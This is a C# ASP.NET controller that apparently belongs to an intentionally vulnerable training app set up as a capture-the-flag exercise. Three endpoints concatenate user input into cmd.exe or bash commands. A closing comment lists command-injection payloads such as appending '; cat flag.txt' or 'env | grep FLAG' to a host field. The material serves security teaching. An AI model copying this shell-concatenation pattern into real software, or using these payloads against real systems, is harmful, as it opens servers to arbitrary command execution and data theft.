using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Authorization;

namespace Verademo.Controllers
{
    [Authorize]
    public class ToolsController : AuthControllerBase
    {
        protected readonly log4net.ILog logger;

        public ToolsController()
        {
            logger = log4net.LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);
        }

        [HttpGet, ActionName("Tools")]
        public ActionResult GetTools()
        {
            logger.Info("Entering Tools page");

            if (IsUserLoggedIn() == false)
            {
                return RedirectToLogin(Request.QueryString.Value);
            }

            return View();
        }

        [HttpPost, ActionName("Ping")]
        public ActionResult PostPing(string host)
        {
            logger.Info("Ping request for host: " + host);

            if (IsUserLoggedIn() == false)
            {
                return RedirectToLogin(Request.QueryString.Value);
            }

            if (string.IsNullOrEmpty(host))
            {
                ViewBag.PingResult = "Please provide a host to ping.";
                return View("Tools");
            }

            try
            {
                /* START BAD CODE - Command Injection Vulnerability */
                
                // VULNERABLE: Direct user input concatenation into system command
                string command;
                string arguments;

                if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                    System.Runtime.InteropServices.OSPlatform.Windows))
                {
                    command = "cmd.exe";
                    arguments = "/c ping -n 4 " + host; // VULNERABLE: No input validation
                }
                else
                {
                    command = "/bin/bash";
                    arguments = "-c \"ping -c 4 " + host + "\""; // VULNERABLE: No input validation
                }

                logger.Info("Executing command: " + command + " " + arguments);

                var processInfo = new ProcessStartInfo(command, arguments)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var process = Process.Start(processInfo);
                var output = process.StandardOutput.ReadToEnd();
                var error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                var result = output;
                if (!string.IsNullOrEmpty(error))
                {
                    result += "\nErrors:\n" + error;
                }

                ViewBag.PingResult = result;
                
                /* END BAD CODE */
            }
            catch (Exception ex)
            {
                logger.Error("Error executing ping: " + ex.Message);
                ViewBag.PingResult = "Error executing ping: " + ex.Message;
            }

            return View("Tools");
        }

        // CTF Challenge: Alternative vulnerable endpoint
        [HttpPost, ActionName("NetworkDiag")]
        public ActionResult PostNetworkDiag(string command, string target)
        {
            logger.Info($"Network diagnostic - Command: {command}, Target: {target}");

            if (IsUserLoggedIn() == false)
            {
                return RedirectToLogin(Request.QueryString.Value);
            }

            if (string.IsNullOrEmpty(command) || string.IsNullOrEmpty(target))
            {
                ViewBag.DiagResult = "Please provide both command and target.";
                return View("Tools");
            }

            try
            {
                /* START BAD CODE - Even More Obvious Command Injection */
                
                string fullCommand;
                if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                    System.Runtime.InteropServices.OSPlatform.Windows))
                {
                    fullCommand = $"cmd.exe /c {command} {target}"; // VERY VULNERABLE
                }
                else
                {
                    fullCommand = $"/bin/bash -c \"{command} {target}\""; // VERY VULNERABLE
                }

                logger.Info("Executing diagnostic command: " + fullCommand);

                var processInfo = new ProcessStartInfo()
                {
                    FileName = System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                        System.Runtime.InteropServices.OSPlatform.Windows) ? "cmd.exe" : "/bin/bash",
                    Arguments = System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                        System.Runtime.InteropServices.OSPlatform.Windows) ? $"/c {command} {target}" : $"-c \"{command} {target}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var process = Process.Start(processInfo);
                var output = process.StandardOutput.ReadToEnd();
                var error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                var result = output;
                if (!string.IsNullOrEmpty(error))
                {
                    result += "\nErrors:\n" + error;
                }

                ViewBag.DiagResult = result;
                
                /* END BAD CODE */
            }
            catch (Exception ex)
            {
                logger.Error("Error executing network diagnostic: " + ex.Message);
                ViewBag.DiagResult = "Error executing diagnostic: " + ex.Message;
            }

            return View("Tools");
        }

        // Bonus: Fortune cookie feature (also vulnerable)
        [HttpPost, ActionName("Fortune")]
        public ActionResult PostFortune(string category = "")
        {
            logger.Info("Fortune request for category: " + category);

            if (IsUserLoggedIn() == false)
            {
                return RedirectToLogin(Request.QueryString.Value);
            }

            try
            {
                /* START BAD CODE - Command Injection in Fortune */
                
                string command;
                string arguments;

                if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                    System.Runtime.InteropServices.OSPlatform.Windows))
                {
                    // Simulate fortune on Windows
                    command = "cmd.exe";
                    arguments = "/c echo Fortune cookie: && echo " + (string.IsNullOrEmpty(category) ? "General wisdom" : category);
                }
                else
                {
                    command = "/bin/bash";
                    arguments = "-c \"fortune " + category + "\""; // VULNERABLE if fortune is installed
                }

                var processInfo = new ProcessStartInfo(command, arguments)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var process = Process.Start(processInfo);
                var output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                ViewBag.FortuneResult = string.IsNullOrEmpty(output) ? 
                    "Your future is bright! (fortune command not available)" : output;
                
                /* END BAD CODE */
            }
            catch (Exception ex)
            {
                logger.Error("Error getting fortune: " + ex.Message);
                ViewBag.FortuneResult = "Fortune unavailable: " + ex.Message;
            }

            return View("Tools");
        }
    }
}

/*
CTF CHALLENGE C: COMMAND INJECTION SETUP

FILES TO CREATE/MODIFY:

1. Controllers/ToolsController.cs (above code)

2. Views/Tools/Tools.cshtml (view file below)

3. Flag Setup:
   - Create flag.txt in application root: echo "FLAG{command_injection_pwned_2024}" > flag.txt
   - Or set environment variable: export CTF_FLAG="FLAG{env_var_command_injection_2024}"
   - Or create /tmp/flag.txt on Linux systems

4. Attack Payloads:

   Basic Command Injection (Linux):
   Host: 127.0.0.1; cat flag.txt
   Host: 127.0.0.1 && cat /tmp/flag.txt
   Host: 127.0.0.1 | cat flag.txt

   Windows Command Injection:
   Host: 127.0.0.1 & type flag.txt
   Host: 127.0.0.1 && type flag.txt

   Environment Variable Extraction:
   Host: 127.0.0.1; env | grep FLAG
   Host: 127.0.0.1 && echo $CTF_FLAG

   Advanced Payloads:
   Host: 127.0.0.1; ls -la /
   Host: 127.0.0.1; whoami
   Host: 127.0.0.1; id

   Network Diagnostic Endpoint:
   Command: ping && cat flag.txt
   Target: 127.0.0.1

5. Expected Results:
   - Ping executes normally
   - Injected command executes after ping
   - Flag content displayed in output

6. Defense (for educational comparison):
   - Input validation/sanitization
   - Whitelist allowed characters
   - Use proper APIs instead of shell commands
   - Run with minimal privileges
*/